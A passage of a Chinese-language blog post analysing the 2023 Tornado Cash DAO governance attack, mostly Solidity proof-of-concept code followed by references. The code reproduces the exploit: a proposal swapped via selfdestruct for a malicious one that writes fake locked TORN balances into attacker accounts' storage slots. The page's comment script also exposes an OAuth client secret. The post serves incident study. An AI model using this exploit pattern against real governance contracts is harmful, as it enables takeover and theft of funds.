if(!deployMaliciousProposal)&#123;</span><br><span class="line">            console2.log(&quot;deploying initial proposal&quot;);</span><br><span class="line">            proposalContractAddr = address(new Proposal_20());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console2.log(&quot;deploying malicious proposal&quot;);</span><br><span class="line">            proposalContractAddr = address(new Malicious_Proposal_20());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            proposalContractAddr != address(0),</span><br><span class="line">            &quot;Proposal contract address cannot be zero&quot;</span><br><span class="line">        );</span><br><span class="line">        proposalAddr = proposalContractAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyStop() external onlyOwner &#123;</span><br><span class="line">        console2.log(&quot;Destorying proposal and  factory&quot;);</span><br><span class="line">        IMaliciousSelfDestruct(proposalAddr).emergencyStop();</span><br><span class="line">        selfdestruct(payable(owner()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Proposal_20 is Ownable &#123; </span><br><span class="line">    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) &#123;</span><br><span class="line">        uint256 nullifiedTotal;</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line"></span><br><span class="line">        for (uint8 x = 0; x &lt; relayers.length; x++) &#123;</span><br><span class="line">            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return nullifiedTotal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeProposal() external &#123;</span><br><span class="line">        address[4] memory VIOLATING_RELAYERS = [</span><br><span class="line">            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth</span><br><span class="line">            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth</span><br><span class="line">            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth</span><br><span class="line">            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line">        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;</span><br><span class="line"></span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);</span><br><span class="line"></span><br><span class="line">        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyStop() public onlyOwner &#123;</span><br><span class="line">        console2.log(&quot;Destroying proposal...&quot;);</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Malicious_Proposal_20 is Ownable &#123;</span><br><span class="line">    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) &#123;</span><br><span class="line">        uint256 nullifiedTotal;</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line"></span><br><span class="line">        for (uint8 x = 0; x &lt; relayers.length; x++) &#123;</span><br><span class="line">            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return nullifiedTotal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeProposal() external &#123;</span><br><span class="line">        address[4] memory VIOLATING_RELAYERS = [</span><br><span class="line">            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth</span><br><span class="line">            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth</span><br><span class="line">            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth</span><br><span class="line">            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line">        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;</span><br><span class="line"></span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);</span><br><span class="line"></span><br><span class="line">        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);</span><br><span class="line"></span><br><span class="line">        // Meaning that the addresses were somehow added as immutables or hardcoded</span><br><span class="line"></span><br><span class="line">        // We need to calculate the lockedBalanceSlot so we can then calculate the offset for each minion</span><br><span class="line">        // mapping: lockedBalances[account] = value, lockedBalances at 59 (0x3b)</span><br><span class="line">        // The attacker knew the addresses of the zombies in advance as they were deployed before</span><br><span class="line">        // Addresses for 5 zombies deployed locally in the TornadoCash_GovFoundryFork test</span><br><span class="line">        address[5] memory zombies = [</span><br><span class="line">            0x9Da940b2Fd184E5c39CC0aE358B380C125a12158,</span><br><span class="line">            0x60A5d1b2Ae271557c0da3f8dC4b4cFcb73D55784,</span><br><span class="line">            0x0bA2c44fAc23fe39EbB66dF4aA02641C67372E78,</span><br><span class="line">            0xfdd66B307434ADd7a7043075e30751f842Ec2f12,</span><br><span class="line">            0xC31add2bAF18796DC6E7660EE4AB06b3E5571642</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        // Addresses for 5 zombies deployed by the attacker on mainnet</span><br><span class="line">        // address[5] memory zombies = [</span><br><span class="line">        //     0xb4d47EE99E132e441Ae3467EB7D70F06d61b10C9,</span><br><span class="line">        //     0x57400EB021F940B258F925c57cD39F240B7366F2,</span><br><span class="line">        //     0xbD23c3ed3DB8a2D07C52F7C6700fDf0888f4f730,</span><br><span class="line">        //     0x548Fd6e5239e9Ce96F3B63F9EEeAd8C461609dc5,</span><br><span class="line">        //     0x6dD8C3C6ADD0F403167bF8d2E527A544464744Bb</span><br><span class="line">        // ];</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; zombies.length; i++) &#123;</span><br><span class="line">            address curMinion = zombies[i];</span><br><span class="line">            uint256 amount = 10_000 ether;</span><br><span class="line">            writeSlot(curMinion, amount, 0x3b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getStorageSlot(address account, uint256 slot) public pure returns (bytes32 hashSlot) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // Store account in memory scratch space</span><br><span class="line">            mstore(0, account)</span><br><span class="line">            // Store slot number in memory after the account</span><br><span class="line">            mstore(32, slot)</span><br><span class="line">            // Get the hash from previously stored account and slot</span><br><span class="line">            hashSlot := keccak256(0, 64)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Write the slot for a mapping key, the initial mapping slot must be known (storage stack)</span><br><span class="line">    function writeSlot(address account, uint256 value, uint256 slot) public &#123;</span><br><span class="line">        bytes32 slotHash = getStorageSlot(account, slot);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slotHash, value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //for test</span><br><span class="line">    function getStorageValue(address account, uint256 slot) public view returns (uint256 result) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // Store num in memory scratch space (note: lookup &quot;free memory pointer&quot; if you need to allocate space)</span><br><span class="line">            mstore(0, account)</span><br><span class="line">            // Store slot number in scratch space after num</span><br><span class="line">            mstore(32, slot)</span><br><span class="line">            // Create hash from previously stored num and slot</span><br><span class="line">            let hash := keccak256(0, 64)</span><br><span class="line">            // Load mapping value using the just calculated hash</span><br><span class="line">            result := sload(hash)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyStop() public onlyOwner &#123;</span><br><span class="line">        console2.log(&quot;Destroying proposal...&quot;);</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="AttackerOwnable-sol"><a href="#AttackerOwnable-sol" class="headerlink" title="AttackerOwnable.sol"></a>AttackerOwnable.sol</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">abstract contract Ownable  &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the contract setting the deployer as the initial owner.</span><br><span class="line">     */</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _transferOwnership(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Throws if called by any account other than the owner.</span><br><span class="line">     */</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        _checkOwner();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the address of the current owner.</span><br><span class="line">     */</span><br><span class="line">    function owner() public view virtual returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Throws if the sender is not the owner.</span><br><span class="line">     */</span><br><span class="line">    function _checkOwner() internal view virtual &#123;</span><br><span class="line">        require(owner() == msg.sender, &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Leaves the contract without owner. It will not be possible to call</span><br><span class="line">     * `onlyOwner` functions. Can only be called by the current owner.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: Renouncing ownership will leave the contract without an owner,</span><br><span class="line">     * thereby disabling any functionality that is only available to the owner.</span><br><span class="line">     */</span><br><span class="line">    function renounceOwnership() public virtual onlyOwner &#123;</span><br><span class="line">        _transferOwnership(address(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfers ownership of the contract to a new account (`newOwner`).</span><br><span class="line">     * Can only be called by the current owner.</span><br><span class="line">     */</span><br><span class="line">    function transferOwnership(address newOwner) public virtual onlyOwner &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfers ownership of the contract to a new account (`newOwner`).</span><br><span class="line">     * Internal function without access restriction.</span><br><span class="line">     */</span><br><span class="line">    function _transferOwnership(address newOwner) internal virtual &#123;</span><br><span class="line">        address oldOwner = _owner;</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">        emit OwnershipTransferred(oldOwner, newOwner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="TornadoGovernance-rep-interface-sol"><a href="#TornadoGovernance-rep-interface-sol" class="headerlink" title="TornadoGovernance_rep.interface.sol"></a>TornadoGovernance_rep.interface.sol</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">interface IMetaDeployer &#123;</span><br><span class="line">    function deployMaliciousProposal() external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMaliciousSelfDestruct &#123;</span><br><span class="line">    function emergencyStop() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IProposal &#123;</span><br><span class="line">    function executeProposal() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IRelayerRegistry &#123;</span><br><span class="line">    function getRelayerBalance(address relayer) external returns (uint256);</span><br><span class="line">    function isRelayer(address relayer) external returns (bool);</span><br><span class="line">    function setMinStakeAmount(uint256 minAmount) external;</span><br><span class="line">    function nullifyBalance(address relayer) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IStakingRewards &#123;</span><br><span class="line">    function withdrawTorn(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ITornadoGovernance &#123;</span><br><span class="line">    enum ProposalState &#123;</span><br><span class="line">        Pending,</span><br><span class="line">        Active,</span><br><span class="line">        Defeated,</span><br><span class="line">        Timelocked,</span><br><span class="line">        AwaitingExecution,</span><br><span class="line">        Executed,</span><br><span class="line">        Expired</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Proposal &#123;</span><br><span class="line">        // Creator of the proposal</span><br><span class="line">        address proposer;</span><br><span class="line">        // target addresses for the call to be made</span><br><span class="line">        address target;</span><br><span class="line">        // The block at which voting begins</span><br><span class="line">        uint256 startTime;</span><br><span class="line">        // The block at which voting ends: votes must be cast prior to this block</span><br><span class="line">        uint256 endTime;</span><br><span class="line">        // Current number of votes in favor of this proposal</span><br><span class="line">        uint256 forVotes;</span><br><span class="line">        // Current number of votes in opposition to this proposal</span><br><span class="line">        uint256 againstVotes;</span><br><span class="line">        // Flag marking whether the proposal has been executed</span><br><span class="line">        bool executed;</span><br><span class="line">        // Flag marking whether the proposal voting time has been extended</span><br><span class="line">        // Voting time can be extended once, if the proposal outcome has changed during CLOSING_PERIOD</span><br><span class="line">        bool extended;</span><br><span class="line">        // Receipts of ballots for the entire set of voters</span><br><span class="line">        mapping(address =&gt; Receipt) receipts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Ballot receipt record for a voter</span><br><span class="line">    struct Receipt &#123;</span><br><span class="line">        // Whether or not a vote has been cast</span><br><span class="line">        bool hasVoted;</span><br><span class="line">        // Whether or not the voter supports the proposal</span><br><span class="line">        bool support;</span><br><span class="line">        // The number of votes the voter had, which were cast</span><br><span class="line">        uint256 votes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockWithApproval(uint256 amount) external;</span><br><span class="line">    function unlock(uint256 amount) external;</span><br><span class="line">    function propose(address target, string memory description) external returns (uint256);</span><br><span class="line">    function execute(uint256 proposalId) external payable;</span><br><span class="line">    function lockedBalance(address from) external returns (uint256);</span><br><span class="line">    function state(uint256 proposalId) external view returns (ProposalState);</span><br><span class="line">    function castVote(uint256 proposalId, bool support) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="六、-资源"><a href="#六、-资源" class="headerlink" title="六、 资源"></a>六、 资源</h2><p><a class="link"   target="_blank" rel="noopener" href="https://etherscan.io/address/0x092123663804f8801b9b086b03b98d706f77bd59" >Tornado.Cash Governance Exploiter<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/tornadocash" >Tornado Cash仓库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://x.com/BlockSecTeam/status/1660214665429876740" >X: BlockSecTeam<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://x.com/samczsun/status/1660012956632104960?s=61&t=Q44QDY9UqgqIZ1n7Sog2Hw" >X: samczsun<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://medium.com/@zan.top/unpacking-the-tornado-cash-governance-attack-15b40691ca2e" >Unpacking the Tornado Cash Governance Attack<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://digital-tails-group.medium.com/tornado-cash-encounters-governance-attack-vulnerability-analysis-ed84c9576d2e" >Tornado Cash Encounters Governance Attack | Vulnerability Analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Tornado Cash DAO Incident分析与POC</li>
+        <li><strong>Author:</strong> Chiu</li>
+        <li><strong>Created at
+                :</strong> 2025-05-15 00:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-14 17:08:13
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://github.com/Idealist17/github.io/2025/05/15/Tornado Cash DAO攻击总结/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/DeFi/">#DeFi</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">#攻击事件分析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/05/27/Sentiment_RO_Reentrancy/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Sentiment协议只读重入攻击分析</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/05/13/Measuring%20Personal%20Growth/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">节选 Measuring personal growth</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23ctdJf8fChgcHijWU',
+                    clientSecret: 'ab085da53c1e5d5699612cc1a17d05a64daa0e25',
+                    repo: 'https://github.com/Idealist17/gitalk',
+                    owner: 'idealist17',
+                    admin: ['idealist17'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Tornado Cash DAO Incident分析与POC</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BA%8B%E4%BB%B6%E8%83%8C%E6%99%AF"><span class="nav-text">一、事件背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Tornado-Cash-%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90"><span class="nav-text">二、Tornado Cash 的系统组成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%A0%B8%E5%BF%83%E6%B7%B7%E5%B8%81%E5%90%88%E7%BA%A6%EF%BC%88Mixing-Protocol%EF%BC%89"><span class="nav-text">1. 核心混币合约（Mixing Protocol）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Tornado-Cash-DAO%EF%BC%88%E6%B2%BB%E7%90%86%E5%90%88%E7%BA%A6%EF%BC%89"><span class="nav-text">2. Tornado Cash DAO（治理合约）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="nav-text">三、攻击流程详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%87%86%E5%A4%87%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%83%B5%E5%B0%B8%E8%B4%A6%E6%88%B7"><span class="nav-text">1. 准备阶段：创建僵尸账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9E%84%E9%80%A0%E5%B9%B6%E6%8F%90%E4%BA%A4%E6%81%B6%E6%84%8F%E6%B2%BB%E7%90%86%E6%8F%90%E6%A1%88"><span class="nav-text">2. 构造并提交恶意治理提案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8-delegatecall-%E7%AF%A1%E6%94%B9%E6%8A%95%E7%A5%A8%E6%9D%83%E4%B8%8E%E6%9D%83%E9%99%90"><span class="nav-text">3. 利用 delegatecall 篡改投票权与权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%89%A7%E8%A1%8C%E8%B5%84%E9%87%91%E7%9B%97%E5%8F%96"><span class="nav-text">5. 执行资金盗取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E5%90%8E%E8%B5%84%E9%87%91%E7%9A%84%E6%B5%81%E8%BD%AC%E8%B7%AF%E5%BE%84"><span class="nav-text">四、攻击后资金的流转路径</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E7%8E%B0%E6%93%8D%E4%BD%9C"><span class="nav-text">变现操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81POC"><span class="nav-text">五、POC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AttackerContracts1-sol"><span class="nav-text">AttackerContracts1.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AttackerContracts2-sol"><span class="nav-text">AttackerContracts2.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AttackerOwnable-sol"><span class="nav-text">AttackerOwnable.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TornadoGovernance-rep-interface-sol"><span class="nav-text">TornadoGovernance_rep.interface.sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81-%E8%B5%84%E6%BA%90"><span class="nav-text">六、 资源</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Chiu</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        35 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
